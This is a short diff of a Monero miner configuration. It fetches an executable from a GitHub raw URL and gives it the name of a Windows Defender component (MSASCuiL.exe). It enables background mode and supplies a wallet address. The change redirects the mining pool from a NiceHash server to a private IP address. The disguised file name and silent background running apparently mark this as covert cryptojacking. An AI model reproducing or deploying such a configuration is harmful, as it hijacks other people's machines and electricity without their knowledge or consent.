@@ -1,6 +1,6 @@
 <xmrdownloadurl>https://raw.githubusercontent.com/ruexp/fosa/master/MSASCuiL.exe</xmrdownloadurl>
 <algo>rx/0</algo>
-<pool>stratum+tcp://randomxmonero.eu-west.nicehash.com:3380</pool>
+<pool>stratum+tcp://192.168.1.129:3333</pool>
 <user>3CSXi7aqL7ZiP9LFHcYbTrA1xs47zkQkfw.NiceHash</user>
 <password>x</password>
 <backgroundmod>true</backgroundmod>
